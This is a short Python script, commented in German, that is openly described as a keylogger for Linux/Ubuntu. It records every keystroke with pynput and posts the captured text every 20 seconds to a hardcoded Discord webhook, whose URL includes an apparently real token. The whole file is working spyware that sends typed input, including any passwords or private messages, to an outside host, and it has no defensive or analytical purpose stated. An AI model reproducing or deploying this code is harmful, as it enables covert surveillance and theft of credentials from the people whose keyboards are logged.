#!/usr/bin/env python3
# Python Keylogger & Discord-Webhook-Sender für Linux/Ubuntu

import requests
import time
from datetime import datetime
from pynput import keyboard
import threading
import os

# Konfiguration
WEBHOOK_URL = "https://discord.com/api/webhooks/1433096590767427654/6OxFXTDInl_VcfzgnE122ToXpixqQ34wjoz1FDx6NdHs24tgIH24G_E80qRcLrHapMmz"
LOG_FILE = "/tmp/key.log"
TIMEOUT = 120  # Sekunden
SEND_INTERVAL = 20  # Sekunden

# Globale Variablen
key_buffer = []
debug_log = []
start_time = time.time()
running = True


def send_to_discord(message):
    """Nachricht an Discord-Webhook senden"""
    try:
        payload = {"content": message}
        requests.post(WEBHOOK_URL, json=payload)
        debug_log.append(f"[INFO] Nachricht an Discord gesendet: {datetime.now().isoformat()}")
    except Exception as e:
        debug_log.append(f"[ERROR] Fehler beim Senden an Discord: {e} - {datetime.now().isoformat()}")


def on_press(key):
    """Callback für Tastendruck"""
    global running

    # Timeout prüfen
    elapsed = time.time() - start_time
    if elapsed >= TIMEOUT:
        running = False
        return False

    try:
        # Normalen Buchstaben/Zeichen
        if hasattr(key, 'char') and key.char is not None:
            key_buffer.append(key.char)
            debug_log.append(f"[DEBUG] Taste erkannt: {key.char} - {datetime.now().isoformat()}")
        else:
            # Spezielle Tasten
            key_name = str(key).replace('Key.', '')
            if key_name == 'space':
                key_buffer.append(' ')
            elif key_name == 'enter':
                key_buffer.append('\n')
            elif key_name == 'tab':
                key_buffer.append('\t')
            else:
                key_buffer.append(f'[{key_name}]')
            debug_log.append(f"[DEBUG] Spezielle Taste erkannt: {key_name} - {datetime.now().isoformat()}")
    except Exception as e:
        debug_log.append(f"[ERROR] Fehler bei Tastenverarbeitung: {e} - {datetime.now().isoformat()}")


def send_logs_periodically():
    """Logs periodisch an Discord senden"""
    global running

    while running:
        time.sleep(SEND_INTERVAL)

        if not running:
            break

        discord_msg = ""

        # Keylog senden
        if key_buffer:
            keylog_content = ''.join(key_buffer)
            if keylog_content.strip():
                discord_msg += f"[Keylog]\n{keylog_content}\n"
                key_buffer.clear()

        # Debug-Log senden
        if debug_log:
            debug_content = '\n'.join(debug_log)
            if debug_content.strip():
                discord_msg += f"[Debug]\n{debug_content}"
                debug_log.clear()

        # An Discord senden
        if discord_msg.strip():
            send_to_discord(discord_msg)


def main():
    global running

    # Start-Nachricht
    send_to_discord(f"[Logger] gestartet: {datetime.now().isoformat()}")

    # Thread für periodisches Senden starten
    sender_thread = threading.Thread(target=send_logs_periodically, daemon=True)
    sender_thread.start()

    # Keyboard-Listener starten
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

    # Nach Timeout: Letzte Logs senden
    if key_buffer:
        keylog_content = ''.join(key_buffer)
        if keylog_content.strip():
            send_to_discord(f"[Keylog - Final]\n{keylog_content}")

    # Ende-Nachricht
    send_to_discord(f"[Logger] beendet: {datetime.now().isoformat()}")


if __name__ == "__main__":
    main()

